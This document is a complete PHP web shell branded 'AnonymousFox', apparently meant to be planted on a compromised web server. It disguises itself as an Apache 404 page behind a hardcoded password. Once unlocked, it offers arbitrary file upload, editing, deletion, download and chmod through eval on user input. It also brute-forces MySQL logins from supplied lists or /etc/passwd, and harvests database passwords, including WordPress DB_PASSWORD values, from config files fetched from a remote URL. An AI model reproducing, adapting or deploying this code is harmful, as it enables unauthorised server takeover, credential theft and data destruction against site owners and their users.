<?php 

@session_start();
@set_time_limit(0);

//PASSWORD CONFIGURATION

@$pass = $_POST['Fuck'];
$chk_login = true;
$password = "mangsut#123";

//END CONFIGURATION

if($pass == $password)
{
 $_SESSION['nst'] = "$pass";
}

if($chk_login == true)
{
 if(!isset($_SESSION['nst']) or $_SESSION['nst'] != $password)

 {
 die("
 <head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /fox.php was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<hr>
<address>Apache/2.4.16 (Unix) OpenSSL/1.0.1e-fips mod_bwlimited/1.4 Server at Port 80</address>
</body>
  
<title>AnonymousFox</title>
  <center>
  <table border=0 cellpadding=0 cellspacing=0 width=100% height=100%>
  <tr><td valign=middle align=center>
  
  <form method=post>
  <font size=1 face=verdana color=><strong><center></center></strong><br>
  <input type=Fuck name=Fuck size=1>
  </form>
  
  ");
 }	 
	 
}

error_reporting(0); 
set_time_limit(0); 
extract(start()); 
/* 
if(get_magic_quotes_gpc()){ 
    foreach($_POST as $key=>$value){ 
        $_POST[$key] = stripslashes($value); 
    } 
} 
*/ 
$_POST['path'] = (isset($_POST['path'])) ? g22b_crypt($_POST['path'],'de') : false; 
$_POST['name'] = (isset($_POST['name'])) ? g22b_crypt($_POST['name'],'de') : false; 
if(isset($_GET['option']) && $_POST['opt'] == 'download'){ 
    header('Content-type: text/plain'); 
    header('Content-Disposition: attachment; filename="'.$_POST['name'].'"'); 
    echo(file_get_contents($_POST['path'])); 
    exit(); 
} 
echo '<!DOCTYPE html> 
<html> 
<head> 
    <title>AnonymousFox</title> 
    <meta name="robots" content="noindex" /> 
    <style> 
        @font-face { 
            font-family: \'Racing Sans One\'; 
            font-style: normal; 
            font-weight: 400; 
            src: local(\'Racing Sans One\'), local(\'RacingSansOne-Regular\'), url(http://g22b.cc/upload/1r3DpWaCiT7y3PD4KgkNyK3fkYX5z1QtDUdIWoaaD_k.woff) format(\'woff\'); 
        } 
        body{ 
            font-family: "Racing Sans One", cursive; 
            background-color: #e6e6e6; 
            text-shadow:0px 0px 1px #757575; 
            margin: 0; 
        } 
        #container{ 
            width: 700px; 
            margin: 20px auto; 
            border: 1px solid black; 
        } 
        #header{ 
            text-align: center; 
            border-bottom: 1px dotted black; 
        } 
        #header h1{ 
            margin: 0; 
        } 
         
        #nav,#menu{ 
            padding-top: 5px; 
            margin-left: 5px; 
            padding-bottom: 5px; 
            overflow: hidden; 
            border-bottom: 1px dotted black; 
        } 
        #nav{ 
            margin-bottom: 10px; 
        } 
         
        #menu{ 
            text-align: center; 
        } 
         
        #content{ 
            margin: 0; 
        } 
         
        #content table{ 
            width: 700px; 
            margin: 0px; 
        } 
        #content table .first{ 
            background-color: silver; 
            text-align: center; 
        } 
        #content table .first:hover{ 
            background-color: silver; 
            text-shadow:0px 0px 1px #757575; 
        } 
        #content table tr:hover{ 
            background-color: #636263; 
            text-shadow:0px 0px 10px #fff; 
        } 
         
        #footer{ 
            margin-top: 10px; 
            border-top: 1px dotted black; 
        } 
        #footer p{ 
            margin: 5px; 
            text-align: center; 
        } 
        .filename,a{ 
            color: #000; 
            text-decoration: none; 
            cursor: pointer; 
        } 
        .filename:hover,a:hover{ 
            color: #fff; 
            text-shadow:0px 0px 10px #ffffff; 
        } 
        .center{ 
            text-align: center; 
        } 
        input,select,textarea{ 
            border: 1px #000000 solid; 
            -moz-border-radius: 5px; 
            -webkit-border-radius:5px; 
            border-radius:5px; 
        } 
    </style> 
    <script> 
function Encoder(name) 
{ 
    var e =  document.getElementById(name); 
    e.value = btoa(e.value); 
    return true; 
} 
</script> 
</head> 
<body> 
     
    <div id="container"> 
        <center><img src="http://d.top4top.net/p_249a4ij1.png"></center>
        <div id="nav"> 
            <div class="path">Current Path : '.nav_link().' 
            <form methdo="GET" onSubmit="Encoder(\'c\');"><font color=red>Or</font> Select Your Path : <input type="text" id="c" size="40" name="path" value="'.$currentpath.'" /><input type="submit" value="Go" /></form></div><br /> 
            <div class="upload"> 
                <form enctype="multipart/form-data" method="POST" action="?path='.$currentpathen.'&up"> 
                Upload File : <input type="file" name="file" /> 
                <input type="submit" value="upload" /> 
                </form> 
            </div> 
            <div class="new"> 
                <form method="POST" action="?path='.$currentpathen.'&new" onSubmit="Encoder(\'kc\')"> 
                <span>New : </span><input name="name" type="text" size="10" id="kc" /> 
                File <input type="radio" name="type" value="file" checked/> 
                Dir <input type="radio" name="type" value="dir" /> 
                <input type="submit" value="Create" /> 
                </form> 
            </div> 
        </div> 
        <div id="content">'; 
if(isset($_GET['cpanel'])){ 
    if(isset($_POST['usernames']) && isset($_POST['passwords'])){ 
        $usernames = base64_decode($_POST['usernames']); 
        $passwords = base64_decode($_POST['passwords']); 

        $count = 0; 
        foreach(explode("\n",$usernames) as $username){ 
            $username = ($_POST['type'] == 'simple') ? $username : passwdtouser($username); 
            foreach(explode("\n",$passwords) as $password){ 
                $username = trim($username); 
                $password = trim($password); 
                $co = mysql_connect('localhost',$username,$password); 
                if($co){ 
                    mysql_close($co); 
                    echo "Tryag~ Username (<font color=red>$username</font>) Password (<font color=red>$password</font>)<br />"; 
                    $count++; 
                } 
            } 
        } 
        echo "$count Usernames Founded."; 
    }else{ 
    echo '<form method="POST" onSubmit="Encoder(\'userc\');Encoder(\'passc\');"> 
    Usernames : <br /> 
    <textarea cols=84 rows=10 id="userc" name="usernames"></textarea><br /> 
    Passwords : <br /> 
    <textarea cols=84 rows=10 id="passc" name="passwords"></textarea><br /> 
    Usernames Type : Simple : <input type="radio" name="type" value="simple" checked="checked"> - /etc/passwd : <input type="radio" name="type" value="pass"> 
    <br /><input type="submit" value="Go"> 
    </form>'; 
    } 
}elseif(isset($_GET['cpanelconf'])){ 
    if(isset($_POST['link'])){ 
        if(file_get_contents($_POST['link'])){ 
            $count = 0; 
            foreach(get_data($_POST['link']) as $info){ 
                $co = mysql_connect('localhost',$info[0],$info[1]); 
                if($co){ 
                    echo "Tryag~ Username (<font color=red>$info[0]</font>) Password (<font color=red>$info[1]</font>)<br />"; 
                    mysql_close($co);    
                } 
            } 
        }else{ 
            echo "<font color=red>Invalid Link Try Again.</font>"; 
        } 
    } 
    echo '<form method="POST"> 
    Configs Link : <input name="link" type="text" value="http://wwww." size="40" /> 
    <input type="submit" value="start" /> 
    </form>'; 
}else{ 

        if(isset($_GET['filesrc'])){ 
            $file = g22b_crypt($_GET['filesrc'],'de'); 
            echo '<div class="center">'.htmlspecialchars($file).'</div><textarea cols="84" rows="25">'.filesrc($file).'</textarea></pre>'; 
        }elseif(isset($_GET['option']) && $_POST['opt'] != 'delete' || (isset($_GET['new']) && $_POST['type'] == 'file')){ 

            echo '<div class="center">'.$_POST['name'].'<br />'; 
             
            if($_POST['opt'] == 'chmod'){ 
                if(isset($_POST['perm'])){ 
     
                    eval('$perm = '.$_POST['perm'].';'); 
                    if(chmod($_POST['path'],$perm)){ 
                        echo '<font color="green">Change Permission Done.</font><br />'; 
                        $permdone = true; 
                    }else{ 
                        echo '<font color="red">Change Permission Error.</font><br />'; 
                    } 
                } 
                if($permdone){ 
                    $perm = $_POST['perm']; 
                }else{ 
                    $perm = substr(sprintf('%o', fileperms($_POST['path'])), -4); 
                } 
                 
                echo '<form method="POST"> 
                Permission : <input name="perm" type="text" size="4" value="'.$perm.'" /> 
                <input type="hidden" name="path" value="'.g22b_crypt($_POST['path'],'en').'"> 
                <input type="hidden" name="name" value="'.g22b_crypt($_POST['name'],'en').'"> 
                <input type="hidden" name="opt" value="chmod"> 
                <input type="submit" value="Go" /> 
                </form>'; 
            }elseif($_POST['opt'] == 'rename'){ 
                 
                if(isset($_POST['newname'])){ 
                    if(rename($_POST['path'],$currentpath.'/'.$_POST['newname'])){ 
                        echo '<font color="green">Change Name Done.</font><br />'; 
                        $_POST['name'] = $_POST['newname']; 
                    }else{ 
                        echo '<font color="red">Change Name Error.</font><br />'; 
                    } 
                } 
                 
                echo '<form method="POST"> 
                New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" /> 
                <input type="hidden" name="path" value="'.g22b_crypt($_POST['path'],'en').'"> 
                <input type="hidden" name="name" value="'.g22b_crypt($_POST['name'],'en').'"> 
                <input type="hidden" name="opt" value="rename"> 
                <input type="submit" value="Go" /> 
                </form>'; 
            }elseif($_POST['opt'] == 'edit' || isset($_GET['new'])){ 
                if(isset($_POST['src'])){ 
                    $fp = fopen($_POST['path'],'w'); 
                    if(fwrite($fp,base64_decode($_POST['src']))){ 
                        echo '<font color="green">Edit File Done.</font><br />'; 
                        $done = true; 
                    }else{ 
                        echo '<font color="red">Edit File Error.</font><br />'; 
                    } 
                    fclose($fp); 
                } 
                if(isset($_GET['new']) && !$done){ 
                    $filecontent = ''; 
                    $_POST['path'] = "$currentpath/$_POST[name]"; 
                }else{ 
                    $filecontent = filesrc($_POST['path']); 
                } 
                echo '<form method="POST" onSubmit="Encoder(\'cc\')"> 
                <textarea cols="84" rows="25" name="src" id="cc">'.$filecontent.'</textarea><br /> 
                <input type="hidden" name="path" value="'.g22b_crypt($_POST['path'],'en').'"> 
                <input type="hidden" name="name" value="'.g22b_crypt($_POST['name'],'en').'"> 
                <input type="hidden" name="type" value="file" /> 
                <input type="hidden" name="opt" value="edit"> 
                <input type="submit" value="Go" /> 
                </form>'; 
            } 
             
            echo '</div>'; 
        }else{ 
            echo '<div class="center">'; 
            if($_POST['opt'] == 'delete'){ 
                if($_POST['type'] == 'dir'){ 
                    if(rmdir($_POST['path'])){ 
                        echo '<font color="green">Delete Dir Done.</font><br />'; 
                    }else{ 
                        echo '<font color="red">Delete Dir Error.</font><br />'; 
                    } 
                }elseif($_POST['type'] == 'file'){ 
                    if(unlink($_POST['path'])){ 
                        echo '<font color="green">Delete File Done.</font><br />'; 
                    }else{ 
                        echo '<font color="red">Delete File Error.</font><br />'; 
                    } 
                } 
            }elseif($_POST['type'] == 'dir' && isset($_GET['new'])){ 
                if(mkdir("$currentpath/$_POST[name]")){ 
                    echo '<font color="green">Create Dir Done.</font><br />'; 
                }else{ 
                    echo '<font color="red">Create Dir Error.</font><br />'; 
                } 
            }elseif(isset($_FILES['file'])){ 
                $userfile_name = $currentpath.'/'.$_FILES['file']['name']; 
                $userfile_tmp = $_FILES['file']['tmp_name']; 
                if(move_uploaded_file($userfile_tmp,$userfile_name)){ 
                    echo '<font color="green">File Upload Done.</font><br />'; 
                }else{ 
                    echo '<font color="red">File Upload Error.</font><br />'; 
                } 
            } 
            echo '</div><table> 
                <tr class="first"> 
                    <td>Name</td> 
                    <td>Size</td> 
                    <td>Permissions</td> 
                    <td>Options</td> 
                </tr>'; 
         
        $dirs = getfiles('dir'); 
        foreach($dirs as $dir){ 
        echo '<div id="dirs"><tr> 
        <td><a href="?path='.$dir['link'].'"><div class="filename">'.$dir['name'].'</div></a></td> 
        <td class="center">'.$dir['size'].'</td> 
        <td class="center"><font color="'.$dir['permcolor'].'">'.$dir['perm'].'</font></td> 
        <td class="center"><form method="POST" action="?path='.$currentpathen.'&option"> 
        <select name="opt"> 
        <option value=""></option> 
        <option value="delete">Delete</option> 
        <option value="chmod">Chmod</option> 
        <option value="rename">Rename</option> 
        </select> 
        <input type="hidden" name="type" value="dir"> 
        <input type="hidden" name="name" value="'.g22b_crypt($dir['name'],'en').'"> 
        <input type="hidden" name="path" value="'.$dir['link'].'"> 
        <input type="submit" value=">" /> 
        </form></td> 
        </tr> 
        </div>'; 
        } 
        echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>'; 
         
        $files = getfiles('file'); 
        foreach($files as $file){ 
            echo '<div id="files"> 
         
        <tr> 
        <td><a href="?path='.$currentpathen.'&filesrc='.$file['link'].'"><div class="filename">'.$file['name'].'</div></a></td> 
        <td class="center">'.$file['size'].'</td> 
        <td class="center"><font color="'.$file['permcolor'].'">'.$file['perm'].'</font></td> 
        <td class="center"><form method="POST" action="?path='.$currentpathen.'&option"> 
        <select name="opt"> 
        <option value=""></option> 
        <option value="delete">Delete</option> 
        <option value="chmod">Chmod</option> 
        <option value="rename">Rename</option> 
        <option value="edit">Edit</option> 
        <option value="download">Download</option> 
        </select> 
        <input type="hidden" name="type" value="file"> 
        <input type="hidden" name="name" value="'.g22b_crypt($file['name'],'en').'"> 
        <input type="hidden" name="path" value="'.$file['link'].'"> 
        <input type="submit" value=">" /> 
        </form></td> 
        </tr></div>'; 
        } 
            echo '</table>'; 
        } 
} 
        echo '</div> 
    </div> 
     
</body> 
</html>'; 

function getfiles($type){ 
    global $currentpath; 
    $dir = scandir($currentpath); 
    $result = array(); 
    foreach($dir as $file){ 
        $current['fullname'] = "$currentpath/$file"; 
        if($type == 'dir'){ 
            if(!is_dir($current['fullname']) || $file == '.' || $file == '..') continue; 
        }elseif($type == 'file'){ 
            if(!is_file($current['fullname'])) continue; 
        } 
         
        $current['name'] = $file; 
        $current['link'] = g22b_crypt($current['fullname'],'en'); 
        $current['size'] = (is_dir($current['fullname'])) ? '--' : file_size($current['fullname']); 
        $current['perm'] = perms($current['fullname']); 
        if(is_writable($current['fullname'])){ 
            $current['permcolor'] = 'green'; 
        }elseif(is_readable($current['fullname'])){ 
            $current['permcolor'] = ''; 
        }else{ 
            $current['permcolor'] = 'red'; 
        } 
         
        $result[] = $current; 
         
    } 
    return $result; 
} 
function start(){ 
    global $_POST,$_GET; 
     
    $result['currentpath'] = (isset($_GET['path'])) ? g22b_crypt($_GET['path'],'de') : cwd(); 
    $result['currentpathen'] = (isset($_GET['path'])) ? $_GET['path'] : g22b_crypt(cwd(),'en'); 
     
    return $result; 
} 
function file_size($file){ 
    $size = filesize($file)/1024; 
    $size = round($size,3); 
    if($size >= 1024){ 
        $size = round($size/1024,2).' MB'; 
    }else{ 
        $size = $size.' KB'; 
    } 
    return $size; 
} 
function g22b_crypt($txt,$type){ 
    if(function_exists('base64_encode') && function_exists('base64_decode')){ 
        return ($type == 'en') ? base64_encode($txt) : base64_decode($txt); 
    }elseif(function_exists('strlen') && function_exists('dechex') && function_exists('ord') && function_exists('chr') && function_exists('hexdec')){ 
        return ($type == 'en') ? strToHex($txt) : hexToStr($txt); 
    }else{ 
        $ar1 = array('public_html','.htaccess','/','.'); 
        $ar2 = array('bbbpubghostbbb','bbbhtaghostbbb','bbbsghostbbb','bbbdotghostbbb'); 
        return ($type == 'en') ? str_replace($ar1,$ar2,$txt) : str_replace($ar2,$ar1,$txt); 
    } 
} 
function strToHex($string){ 
    $hex=''; 
    for ($i=0; $i < strlen($string); $i++) 
    { 
        $hex .= dechex(ord($string[$i])); 
    } 
    return $hex; 
} 
function hexToStr($hex){ 
    $string=''; 
    for ($i=0; $i < strlen($hex)-1; $i+=2) 
    { 
        $string .= chr(hexdec($hex[$i].$hex[$i+1])); 
    } 
    return $string; 
} 
function nav_link(){ 
    global $currentpath; 
    $path = $currentpath; 
    $path = str_replace('\\','/',$path); 
    $paths = explode('/',$path); 
    $result = ''; 
    foreach($paths as $id=>$pat){ 
        if($pat == '' && $id == 0){ 
            $a = true; 
            $result .= '<a href="?path='.g22b_crypt("/",'en').'">/</a>'; 
            continue; 
        } 
        if($pat == '') continue; 
        $result .= '<a href="?path='; 
        $linkpath = ''; 
        for($i=0;$i<=$id;$i++){ 
            $linkpath .= "$paths[$i]"; 
            if($i != $id) $linkpath .= "/"; 
        } 
        $result .= g22b_crypt($linkpath,'en'); 
        $result .=  '">'.$pat.'</a>/'; 
    } 
    return $result; 
} 
function filesrc($file){ 
    return htmlspecialchars(file_get_contents($file)); 
} 
function cwd(){ 
    if(function_exists('getcwd')){ 
        return getcwd(); 
    }else{ 
        $e = str_replace("\\","/",$path); 
        $e = explode('/',$path); 
        $result = ''; 
        for($i=0;$i<count($e)-1;$i++){ 
            if($e[$i] == '') continue; 
            $result .= '/'.$e[$i]; 
        } 
        return $result; 
    } 
} 
function passwdtouser($line){ 
    $user = explode(':',$line); 
    return $user[0]; 
} 
function ex($a,$b,$text){ 
    $explode = explode($a,$text); 
    $explode = explode($b,$explode[1]); 
    return trim($explode[0]); 
} 
function get_data($url){ 
    $ar = array('1.txt','2.txt','3.txt','4.txt','5.txt','6.txt','7.txt','8.txt','9.txt','0.txt'); 
    $src = file_get_contents($url); 
    $files = explode('<a href="',$src); 
    $data = array(); 
    foreach($files as $id=>$file){ 
        if($id == 0) continue; 
    $file = explode('">',$file); 
    $file = trim($file[0]); 
    if(!eregi('.txt',$file)) continue; 
    $src = file_get_contents("$url/$file"); 
    if(!$src) continue; 
    $user = str_replace($ar,'',$file); 
    $user = str_replace($ar,'',$user.'.txt'); 
    $user = str_replace($ar,'',$user.'.txt'); 
    $user = trim(str_replace('.txt','',$user)); 
    if(eregi("WordPress",$src)){ 
        $pass = ex("define('DB_PASSWORD', '","');",$src); 
        $data[] = array($user,$pass); 
    }else{ 
        $tokens = token_get_all($src); 
        foreach($tokens as $token){ 
            if(!$token[1]) continue; 
            $tokenname = token_name($token[0]); 
            if($tokenname != 'T_VARIABLE') continue; 
            $var = $token[1]; 
            if(eregi('pass',$var)){ 
                $f = str_replace(' ','',ex($var,';',$src)); 
                $a = trim(ex("='","'",$f)); 
                $b = trim(ex('"','"',$f)); 
                if($a != ''){ 
                    $pass = $a; 
                }elseif($b != ''){ 
                    $pass = $b; 
                } 
                if($pass == '') continue; 
                $data[] = array($user,$pass); 
            } 
        } 
    } 
    } 
    return $data; 
} 
function perms($file){ 
    $perms = @fileperms($file); 

if (($perms & 0xC000) == 0xC000) { 
    // Socket 
    $info = 's'; 
} elseif (($perms & 0xA000) == 0xA000) { 
    // Symbolic Link 
    $info = 'l'; 
} elseif (($perms & 0x8000) == 0x8000) { 
    // Regular 
    $info = '-'; 
} elseif (($perms & 0x6000) == 0x6000) { 
    // Block special 
    $info = 'b'; 
} elseif (($perms & 0x4000) == 0x4000) { 
    // Directory 
    $info = 'd'; 
} elseif (($perms & 0x2000) == 0x2000) { 
    // Character special 
    $info = 'c'; 
} elseif (($perms & 0x1000) == 0x1000) { 
    // FIFO pipe 
    $info = 'p'; 
} else { 
    // Unknown 
    $info = 'u'; 
} 

// Owner 
$info .= (($perms & 0x0100) ? 'r' : '-'); 
$info .= (($perms & 0x0080) ? 'w' : '-'); 
$info .= (($perms & 0x0040) ? 
            (($perms & 0x0800) ? 's' : 'x' ) : 
            (($perms & 0x0800) ? 'S' : '-')); 

// Group 
$info .= (($perms & 0x0020) ? 'r' : '-'); 
$info .= (($perms & 0x0010) ? 'w' : '-'); 
$info .= (($perms & 0x0008) ? 
            (($perms & 0x0400) ? 's' : 'x' ) : 
            (($perms & 0x0400) ? 'S' : '-')); 

// World 
$info .= (($perms & 0x0004) ? 'r' : '-'); 
$info .= (($perms & 0x0002) ? 'w' : '-'); 
$info .= (($perms & 0x0001) ? 
            (($perms & 0x0200) ? 't' : 'x' ) : 
            (($perms & 0x0200) ? 'T' : '-')); 

    return $info; 
} 
?>

<html>
<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
<center><font style="color:black;text-shadow:0px 1px 5px #000;font-size:30px" face="Iceland">Coder </font><font style="color:white;text-shadow:0px 1px 5px #000;font-size:30px" face="Iceland">:</font><font style="color:red;text-shadow:0px 1px 5px #000;font-size:30px" face="Iceland"> AnonymousFox</font></center>
<br>
</HTML>